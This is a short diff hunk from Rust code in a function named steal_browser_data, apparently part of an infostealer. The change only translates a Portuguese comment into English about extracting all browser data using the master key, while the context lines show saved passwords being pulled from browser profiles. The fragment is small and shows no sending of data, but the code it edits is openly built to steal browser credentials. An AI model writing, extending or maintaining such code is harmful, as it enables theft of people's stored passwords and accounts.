@@ -41,7 +41,7 @@ pub fn steal_browser_data() -> BrowserData {
                 continue;
             }
 
-            // Extrai todos os dados do navegador
+            // Extract all browser data using the master key
             all_data.passwords.extend(database::get_passwords(
                 browser.name,
                 &profile_path,
